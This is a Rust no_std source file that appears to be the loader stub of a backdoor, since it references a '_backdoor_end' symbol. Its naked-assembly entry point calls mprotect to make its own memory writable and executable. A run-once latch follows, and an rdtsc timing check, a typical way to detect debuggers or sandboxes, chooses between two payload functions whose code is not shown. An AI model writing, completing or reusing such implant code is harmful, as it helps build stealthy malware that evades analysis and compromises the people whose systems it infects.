#![no_main]
#![no_std]

use core::{arch::{naked_asm, x86_64::_rdtsc}, hint::black_box, panic::PanicInfo, sync::atomic::AtomicBool};

use linux_syscall::{SYS_write, syscall};

pub mod sys;
pub mod garbage;
pub mod payload;

unsafe extern "C" {
    static _backdoor_end: u64;
}

#[unsafe(no_mangle)]
#[unsafe(naked)]
pub unsafe extern "C" fn _entry() {
    naked_asm!(
        "lea r10, [rip]",

        "mov rax, QWORD PTR [rip + {latch}]",
        "cmp rax, 1",
        "je 1f",

        //Setup memory
        "mov rax, 10",
        "mov rdi, r10",
        "and rdi, {mask}",
        "mov rsi, {range}",
        "mov rdx, {prot}",
        "syscall",

        "mov rdi, r10",
        "jmp {start}",

        "1: ret",
        //TODO make it better
        range = const 4096 * 22,
        mask = const u64::MAX << 12,
        prot = const sys::PROT_EXECUTE | sys::PROT_WRITE,
        start = sym _start,
        latch = sym LATCH,
    )
}

static LATCH: AtomicBool = AtomicBool::new(false);

pub extern "C" fn _start(load_location: usize) {
    let start = unsafe { _rdtsc() };
    if LATCH.compare_exchange(false, true, core::sync::atomic::Ordering::AcqRel, core::sync::atomic::Ordering::Relaxed).is_err() {
        return;
    }
    black_box(garbage::_dummy());
    let end = unsafe { _rdtsc() };
    let diff = end - start;
    if diff > 2000 {
        self::payload::run_secondary();
    } else {
        self::payload::run();
    }
}

#[panic_handler]
pub fn handler(_: &PanicInfo<'_>) -> ! {
    loop {}
}